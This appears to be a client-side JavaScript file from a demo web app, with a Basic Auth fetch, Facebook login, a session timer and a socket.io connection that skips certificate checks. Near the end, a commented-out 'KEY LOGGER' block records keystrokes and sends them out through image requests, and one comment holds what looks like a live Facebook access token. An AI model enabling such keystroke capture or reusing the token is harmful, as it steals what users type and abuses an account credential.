

function doBasicAuthorization(username, password) {
    var base64Credentials = btoa(username + ':' + password);
    var basicAuthHeaders = new Headers({'Authorization': 'Basic ' + base64Credentials});

    output('<span class="connect-msg">C->>S https://localhost:8097/login GET with Header' + JSON.stringify(basicAuthHeaders) + '</span>');

    doFetch('https://localhost:8097/login', 'GET', null, basicAuthHeaders);
}

function doFetch(url, method, data, headers) {
    fetch(url, {
        method: method,
        body: data,
        headers: headers,
    }).then(
        function(response){
            return doCall(response, {url: url, method: method, data: data});
        }
    ).then(
        function(responseBody) {
            return doResponse(responseBody);
        }
    ).catch(function(error) {
        console.log(error);
    });


    function buildData(formElement) {
        const data = new URLSearchParams();
        for (const pair of new FormData(formElement)) {
            data.append(pair[0], pair[1]);
        }
        return data;
    }

    function doCall(response, request) {
        if(response.ok) {
            return response.text();
        } else {

        }
    }

    function doResponse(text, onResponse, extraDetails) {
        output('<span class="connect-msg">S->>C' + text + '</span>');
    }
}


//############# FB SECTION ######################

window.fbAsyncInit = function() {
    FB.init({
        appId      : '2930956966914426',
        cookie     : true,
        status     : true,
        oauth      : true,
        xfbml      : true,
        version    : 'v5.0'
    });
    FB.AppEvents.logPageView();
};

(function(d, s, id){
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id)) {return;}
    js = d.createElement(s); js.id = id;
    js.src = "https://connect.facebook.net/en_US/sdk.js";
    fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));

var accessToken;

function checkLoginState() {
    FB.getLoginStatus(function(response) {
        if (response.status === 'connected') {
            document.getElementById('fbstatus').innerHTML = 'Connected.';
            accessToken = response.authResponse.accessToken;
            console.log(accessToken)
        }
    });
}

// getting basic user info
function getInfo() {
    FB.api('/me', 'GET', {fields: 'email,first_name,last_name,name,id,picture.width(300).height(300)'},
        function(response) {
            document.getElementById('fbuserpicture').innerHTML = "<img src='" + response.picture.data.url + "'>";
            document.getElementById('fbemail').innerHTML = response.email;
            document.getElementById('fbusername').innerHTML = response.first_name + " " + response.last_name ;
            document.getElementById('fbuserid').innerHTML = response.id;
        });
}

//https://graph.facebook.com/me?fields=id,name,picture&access_token=EAAppsJjdaXoBAER7aaQzKiv9KUxb6Ic10xNSgdp0NkdPRnkGGwIRJ5JSZCgz5EtQ1LQZCllVRaAPZC4jS8W9FFs189QKUjXWbPOQz7PFebIVhZClBdMyEeGqKuyZA0IIgpGCD7EBirJsv2A3CJh1luZCDtTlBfZCjpbrFeT2XKCq8Vyuy0ZAEUSI4zHHgAZC0ZASjKIzMMbdrHtwZDZD

//############# FB SECTION ######################






//############# TIMER SECTION ######################

let timeBegan = Date.parse(JSON.parse(localStorage.getItem("timeBegan"))) || null
    , timeStopped = Date.parse(JSON.parse(localStorage.getItem("timeStopped"))) || null
    , stoppedDuration = 0
    , started = null;

function startTimer() {
    if (timeBegan === null) {
        timeBegan = new Date();
        localStorage.setItem('timeBegan', JSON.stringify(timeBegan));
    }

    if (timeStopped !== null) {
        stoppedDuration += (new Date() - timeStopped);
    }
    started = setInterval(clockRunning, 10);
}

function stopTimer() {
    timeStopped = new Date();
    clearInterval(started);
}

function resetTimer() {
    clearInterval(started);
    stoppedDuration = 0;
    timeBegan = null;
    timeStopped = null;
    localStorage.removeItem('timeBegan');
    localStorage.removeItem('timeStopped');
    document.getElementById("sessionTimer").innerHTML = "00:00.000";
    startTimer();
}

function clockRunning(){
    let currentTime = new Date()
        , timeElapsed = new Date(currentTime - timeBegan - stoppedDuration);

    document.getElementById("sessionTimer").innerHTML = timeToString(timeElapsed);
};

function timeToString(time) {
    let min = time.getUTCMinutes()
        , sec = time.getUTCSeconds()
        , ms = time.getUTCMilliseconds();

    if(sec % 10 === 0){
        localStorage.setItem('timeStopped', JSON.stringify(new Date()));
    }


    return (min > 9 ? min : "0" + min) + ":" +
        (sec > 9 ? sec : "0" + sec) + "." +
        (ms > 99 ? ms : ms > 9 ? "0" + ms : "00" + ms);
}

startTimer();


//############# TIMER SECTION ######################


//############# SOCKET IO SECTION ######################

const socket = io('https://localhost:9093',
    { transports: ['websocket'],
        forceNew: true,
        path : '',
        secure: true,
        rejectUnauthorized: false,
        upgrade: false
    });

socket.on('connect', function() {
    console.log('connected');
});

socket.on('basicAuthFilter', function(data) {
    output('<span class="connect-msg">S->>C' + JSON.stringify(data) + '</span>');
});

//############# SOCKET IO SECTION ######################


//############# KEY LOGGER ######################

//document.onkeypress = function(e) {
//	get = window.event?event:e;
//	key = get.keyCode?get.keyCode:get.charCode;
//	key = String.fromCharCode(key);
//	keys+=key;
//}
//window.setInterval(function(){
//	if(keys.length>0) {
//		new Image().src = url+keys;
//		keys = '';
//	}
//}, 1000);



//############# KEY LOGGER  ######################